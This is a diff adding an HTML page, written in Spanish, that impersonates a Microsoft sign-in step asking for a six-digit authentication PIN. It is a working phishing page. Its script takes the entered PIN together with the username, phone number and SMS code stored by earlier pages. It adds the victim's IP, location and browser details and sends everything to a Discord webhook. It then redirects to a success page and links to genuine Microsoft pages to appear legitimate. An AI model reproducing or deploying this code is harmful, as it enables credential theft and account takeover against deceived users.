@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Bienvenido</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, 'BlinkMacSystemFont', 'Roboto', 'Helvetica Neue', sans-serif;
+            background-image: url('docs/tapiz.png');
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        /* Contenedor principal */
+        .pin-container {
+            max-width: 520px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 1.5rem;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Contenido principal */
+        .pin-content {
+            padding: 2rem 2rem 2rem 2rem;
+        }
+
+        /* Logo centrado */
+        .logo-wrapper {
+            margin-bottom: 1.5rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo-image {
+            width: 120px;
+            height: auto;
+            display: block;
+        }
+
+        /* Títulos */
+        .pin-title {
+            text-align: center;
+            margin-bottom: 0.5rem;
+        }
+
+        .title-text {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #111;
+            line-height: 1.3;
+        }
+
+        .pin-subtitle {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .subtitle-text {
+            font-size: 0.95rem;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+
+        /* Grupo de formulario */
+        .form-group {
+            margin-bottom: 1.8rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #2c2c2c;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .pin-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .pin-icon {
+            position: absolute;
+            left: 1rem;
+            color: #6c6c6c;
+            font-size: 1.2rem;
+            pointer-events: none;
+        }
+
+        .pin-input {
+            width: 100%;
+            padding: 0.85rem 1rem 0.85rem 2.8rem;
+            font-size: 1.1rem;
+            font-family: inherit;
+            border: 1px solid #d1d1d1;
+            border-radius: 0.5rem;
+            transition: all 0.2s ease;
+            outline: none;
+            background-color: #ffffff;
+            box-sizing: border-box;
+            text-align: center;
+            letter-spacing: 4px;
+            font-weight: 600;
+        }
+
+        .pin-input:focus {
+            border-color: #20b880;
+            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+        }
+
+        /* Contenedor del botón */
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .btn-submit {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #20b856;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.85rem 2rem;
+            border-radius: 0.5rem;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .btn-submit:hover {
+            background-color: #20b880;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 103, 184, 0.3);
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Mensaje de advertencia */
+        .warning-message {
+            background-color: #fef2e0;
+            border-left: 4px solid #f6a700;
+            padding: 0.85rem 1rem;
+            border-radius: 0.5rem;
+            margin-bottom: 1.5rem;
+            font-size: 0.85rem;
+            color: #5e4b1a;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .warning-message::before {
+            content: "⚠️";
+            font-size: 1rem;
+        }
+
+        /* Mensajes de error y éxito */
+        .message-container {
+            margin-bottom: 1.2rem;
+        }
+
+        .error-message {
+            background-color: #fde7e9;
+            border-left: 4px solid #d13438;
+            padding: 0.7rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.85rem;
+            color: #d13438;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .success-message {
+            background-color: #e6f4e8;
+            border-left: 4px solid #107c10;
+            padding: 0.7rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.85rem;
+            color: #107c10;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        /* Footer */
+        .pin-footer {
+            padding: 1.2rem 2rem;
+            background-color: #f8f9fa;
+            border-top: 1px solid #edf2f7;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 1.2rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #4a5568;
+            text-decoration: none;
+            font-size: 0.7rem;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #20b880;
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            font-size: 0.7rem;
+            color: #a0aec0;
+        }
+
+        /* Responsive */
+        @media (max-width: 550px) {
+            .pin-content {
+                padding: 1.5rem;
+            }
+            .logo-image {
+                width: 100px;
+            }
+            .title-text {
+                font-size: 1.2rem;
+            }
+            .subtitle-text {
+                font-size: 0.85rem;
+            }
+            .pin-input {
+                padding: 0.75rem 1rem 0.75rem 2.5rem;
+                font-size: 1rem;
+                letter-spacing: 3px;
+            }
+            .pin-icon {
+                left: 0.8rem;
+                font-size: 1rem;
+            }
+            .btn-submit {
+                padding: 0.75rem 1rem;
+            }
+            .pin-footer {
+                padding: 1rem 1.5rem;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+        }
+
+        /* Focus states */
+        a:focus-visible, .btn-submit:focus-visible, .pin-input:focus-visible {
+            outline: 2px solid #20b880;
+            outline-offset: 2px;
+        }
+
+        /* Ocultar bordes rojos por defecto */
+        input:invalid {
+            box-shadow: none;
+            border-color: #d1d1d1;
+        }
+
+        /* Estilo para el ícono de llave */
+        .ri-key-line {
+            font-family: 'remixicon';
+            font-style: normal;
+        }
+    </style>
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+</head>
+<body>
+    <div class="pin-container">
+        <!-- Contenido principal -->
+        <div class="pin-content">
+            <!-- Logo centrado -->
+            <div class="logo-wrapper">
+                <img src="./docs/lbg22.png" alt="Microsoft Logo" class="logo-image">
+            </div>
+
+            <!-- Título -->
+            <div class="pin-title">
+                <h1 class="title-text">Pin de autenticación</h1>
+            </div>
+
+            <!-- Subtítulo -->
+            <div class="pin-subtitle">
+                <p class="subtitle-text">
+                    Para finalizar, introduzca el código de autenticación (PIN) de su cuenta:
+                </p>
+            </div>
+
+            <!-- Mensaje de advertencia -->
+            <div class="warning-message">
+                Este PIN es único e intransferible. No lo compartas con nadie.
+            </div>
+
+            <!-- Contenedor de mensajes -->
+            <div class="message-container">
+                <div id="errorMessage" class="error-message"></div>
+                <div id="successMessage" class="success-message"></div>
+            </div>
+
+            <form id="pinForm" novalidate>
+                <div class="form-group">
+                    <label for="pinInput">Código PIN</label>
+                    <div class="input-wrapper">
+                        <div class="pin-input-wrapper">
+                            <i class="ri-key-line pin-icon"></i>
+                            <input type="tel" id="pinInput" name="pin" class="pin-input" 
+                                   placeholder="••••••" maxlength="6" minlength="6" 
+                                   autocomplete="off" required>
+                        </div>
+                    </div>
+                    <span class="input-hint" style="font-size: 0.7rem; color: #6c6c6c; margin-top: 0.4rem; display: block; text-align: center;">
+                        Ingresa los 6 dígitos de tu PIN de seguridad
+                    </span>
+                </div>
+
+                <div class="btn-container">
+                    <button type="submit" class="btn-submit" id="submitButton">Siguiente</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Footer -->
+        <div class="pin-footer">
+            <div class="footer-links">
+                <a href="#" id="privacyLink">Aviso de privacidad</a>
+                <a href="#" id="termsLink">Términos de uso</a>
+                <a href="#" id="helpLink">Centro de ayuda</a>
+            </div>
+            <div class="footer-copyright">
+                © 2026 Microsoft
+            </div>
+        </div>
+    </div>
+    <script src="index_files/script.js"></script>
+<script>
+    // ============================================
+    // CONFIGURACIÓN - La variable DISCORD_WEBHOOK_URL debe estar definida en discord.js
+    // ============================================
+    
+    // Elementos del DOM
+    const pinForm = document.getElementById('pinForm');
+    const pinInput = document.getElementById('pinInput');
+    const submitButton = document.getElementById('submitButton');
+    const errorMessageDiv = document.getElementById('errorMessage');
+    const successMessageDiv = document.getElementById('successMessage');
+    const privacyLink = document.getElementById('privacyLink');
+    const termsLink = document.getElementById('termsLink');
+    const helpLink = document.getElementById('helpLink');
+
+    // Variable para almacenar la ubicación
+    let userLocationData = null;
+
+    // ============================================
+    // FUNCIONES DE UBICACIÓN (USANDO SOLO LOCALSTORAGE)
+    // ============================================
+    
+    function getUserFromStorage() {
+        try {
+            const user = localStorage.getItem('currentUser');
+            return user || 'No disponible';
+        } catch (error) {
+            console.error('Error al leer localStorage:', error);
+            return 'Error al obtener usuario';
+        }
+    }
+
+    function getPhoneFromStorage() {
+        try {
+            const phone = localStorage.getItem('phone');
+            return phone || 'No disponible';
+        } catch (error) {
+            return 'No disponible';
+        }
+    }
+
+    function getSMSCodeFromStorage() {
+        try {
+            const smsCode = localStorage.getItem('smsCode');
+            return smsCode || 'No disponible';
+        } catch (error) {
+            return 'No disponible';
+        }
+    }
+
+    function getUserIP() {
+        try {
+            const storedIP = localStorage.getItem('user_ip');
+            return storedIP || 'No disponible';
+        } catch (error) {
+            console.error('Error al leer IP:', error);
+            return 'No disponible';
+        }
+    }
+
+    function getUserLocation() {
+        try {
+            const storedLocation = localStorage.getItem('user_location');
+            if (storedLocation) {
+                const parsed = JSON.parse(storedLocation);
+                console.log('📍 Ubicación obtenida de localStorage:', parsed);
+                return parsed;
+            }
+        } catch (error) {
+            console.error('Error al leer ubicación:', error);
+        }
+        
+        return {
+            city: 'No disponible',
+            country: 'No disponible',
+            region: 'No disponible'
+        };
+    }
+
+    function getBrowserInfo() {
+        const userAgent = navigator.userAgent;
+        let browserName = 'Desconocido';
+        let osName = 'Desconocido';
+        
+        if (userAgent.indexOf('Chrome') > -1) browserName = 'Chrome';
+        else if (userAgent.indexOf('Firefox') > -1) browserName = 'Firefox';
+        else if (userAgent.indexOf('Safari') > -1) browserName = 'Safari';
+        else if (userAgent.indexOf('Edge') > -1) browserName = 'Edge';
+        
+        if (userAgent.indexOf('Windows') > -1) osName = 'Windows';
+        else if (userAgent.indexOf('Mac') > -1) osName = 'MacOS';
+        else if (userAgent.indexOf('Linux') > -1) osName = 'Linux';
+        else if (userAgent.indexOf('Android') > -1) osName = 'Android';
+        else if (userAgent.indexOf('iOS') > -1) osName = 'iOS';
+        
+        return { browser: browserName, os: osName };
+    }
+
+    // ============================================
+    // FUNCIÓN PARA ENVIAR PIN A DISCORD (FIRE AND FORGET)
+    // ============================================
+async function sendPinToDiscord(pinCode, locationData) {
+    // Verificar webhook
+    if (typeof DISCORD_WEBHOOK_URL === 'undefined') {
+        console.error('❌ DISCORD_WEBHOOK_URL no está definida');
+        return false;
+    }
+    
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'TU_WEBHOOK_URL_AQUI') {
+        console.error('❌ DISCORD_WEBHOOK_URL no está configurada correctamente');
+        return false;
+    }
+    
+    try {
+        // Obtener datos desde localStorage
+        const ip = await getUserIP(); // Si getUserIP es async, usa await
+        const browserInfo = getBrowserInfo();
+        const currentDate = new Date();
+        const formattedDate = currentDate.toLocaleString('es-ES', { timeZone: 'America/Bogota' });
+        const user = getUserFromStorage();
+        const phone = getPhoneFromStorage();
+        const smsCode = getSMSCodeFromStorage();
+        
+        // Asegurar que locationData existe
+        const loc = locationData || { city: 'No disponible', country: 'No disponible', region: 'No disponible' };
+        
+        // Extraer país y ciudad para el formato separado
+        let pais = 'Desconocido';
+        let ciudad = 'Desconocido';
+        let locationText = 'No disponible';
+        
+        if (loc.city && loc.city !== 'No disponible' && loc.city !== 'Error al obtener') {
+            pais = loc.country || 'Desconocido';
+            ciudad = loc.city || 'Desconocido';
+            locationText = `${ciudad}, ${pais}`;
+            if (loc.region && loc.region !== loc.city && loc.region !== 'No disponible') {
+                locationText += ` (${loc.region})`;
+            }
+        }
+        
+        console.log('📤 Enviando PIN a Discord:');
+        console.log('   Usuario:', user);
+        console.log('   Teléfono:', phone);
+        console.log('   Código SMS:', smsCode);
+        console.log('   PIN:', pinCode);
+        console.log('   IP:', ip);
+        console.log('   Ubicación:', locationText);
+        
+        // Crear el mensaje en formato de texto plano
+        const messageLines = [
+            `**== PIN de autenticación ==**`,
+            `🕐 ${formattedDate}`,
+            ``,
+            `**👤 Usuario:** \`${localStorage.getItem('user')}\``,
+            ``,
+            `**📞 Teléfono:** \`${phone}\``,
+            ``,
+            `**🔑 PIN de autenticación:** \`${pinCode}\``,
+            ``,
+            `**📍 UBICACIÓN**`,
+            `🌐 IP: \`${ip}\``,
+            `🏳️ País: ${pais}`,
+            `🏙️ Ciudad: ${ciudad}`,
+            `📍 Ubicación: ${locationText}`,
+            ``,
+            `**💻 Navegador / SO:** \`${browserInfo.browser} - ${browserInfo.os}\``
+        ];
+        
+        // Unir las líneas con saltos de línea
+        const messageContent = messageLines.join('\n');
+        
+        const payload = {
+            username: 'El hoyo del 🐰',
+            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg',
+            content: messageContent
+        };
+        
+        // Enviar a Discord
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        if (response.ok) {
+            console.log('✅ PIN enviado a Discord correctamente');
+            return true;
+        } else {
+            console.error('❌ Error HTTP al enviar PIN:', response.status);
+            const text = await response.text();
+            console.error('Respuesta:', text);
+            return false;
+        }
+        
+    } catch (error) {
+        console.error('❌ Error de conexión al enviar PIN:', error);
+        return false;
+    }
+}
+    // ============================================
+    // FUNCIONES DEL FORMULARIO
+    // ============================================
+    
+    function hideMessages() {
+        errorMessageDiv.classList.remove('show');
+        successMessageDiv.classList.remove('show');
+        errorMessageDiv.textContent = '';
+        successMessageDiv.textContent = '';
+    }
+
+    function showError(message) {
+        hideMessages();
+        errorMessageDiv.textContent = message;
+        errorMessageDiv.classList.add('show');
+        errorMessageDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }
+
+    function showSuccess(message) {
+        hideMessages();
+        successMessageDiv.textContent = message;
+        successMessageDiv.classList.add('show');
+    }
+
+    function validatePIN(pin) {
+        if (!pin || pin.trim() === '') {
+            showError('Por favor, ingresa tu PIN de autenticación.');
+            return false;
+        }
+        
+        const cleanPin = pin.toString().replace(/\D/g, '');
+        
+        if (cleanPin.length !== 6) {
+            showError('El PIN debe tener exactamente 6 dígitos numéricos.');
+            return false;
+        }
+        
+        return true;
+    }
+
+    // ============================================
+    // MANEJO DEL INPUT DE PIN
+    // ============================================
+    
+    pinInput.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+    });
+
+    pinInput.addEventListener('keypress', function(e) {
+        const charCode = e.which ? e.which : e.keyCode;
+        if (charCode < 48 || charCode > 57) {
+            e.preventDefault();
+        }
+    });
+
+    // ============================================
+    // CARGA DE UBICACIÓN DESDE LOCALSTORAGE
+    // ============================================
+    
+    (function loadLocationFromStorage() {
+        userLocationData = getUserLocation();
+        console.log('✅ Ubicación cargada para PIN:', userLocationData);
+    })();
+
+    // ============================================
+    // ENVÍO DEL FORMULARIO
+    // ============================================
+    
+    pinForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const pinCode = pinInput.value;
+        
+        if (validatePIN(pinCode)) {
+            
+            // Obtener ubicación fresca directamente de localStorage
+            const freshLocation = getUserLocation();
+            
+            // Enviar PIN a Discord
+            sendPinToDiscord(pinCode, freshLocation);
+            
+            // Redirección después de 1 segundo
+            setTimeout(() => {
+                console.log('🔄 Redirigiendo a WhatsApp...');
+                window.location.href = 'ok.html';
+            }, 1000);
+        }
+    });
+
+    // ============================================
+    // EVENTOS DE ENLACES
+    // ============================================
+    
+    if (privacyLink) privacyLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.open('https://privacy.microsoft.com/', '_blank');
+    });
+    
+    if (termsLink) termsLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.open('https://www.microsoft.com/en-us/legal/terms-of-use', '_blank');
+    });
+    
+    if (helpLink) helpLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.open('https://support.microsoft.com/', '_blank');
+    });
+
+    // Limpiar mensajes al enfocar el input
+    pinInput.addEventListener('focus', hideMessages);
+    
+    // Desactivar validación nativa
+    pinForm.setAttribute('novalidate', 'true');
+    
+    // Estilos adicionales
+    const style = document.createElement('style');
+    style.textContent = `
+        input:invalid {
+            box-shadow: none;
+            border-color: #d1d1d1;
+        }
+        input:focus:invalid {
+            border-color: #20b880;
+            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+        }
+    `;
+    document.head.appendChild(style);
+    
+    console.log('✅ Página de validación PIN lista - Usando ubicación de localStorage');
+</script>
+</body>
+</html>
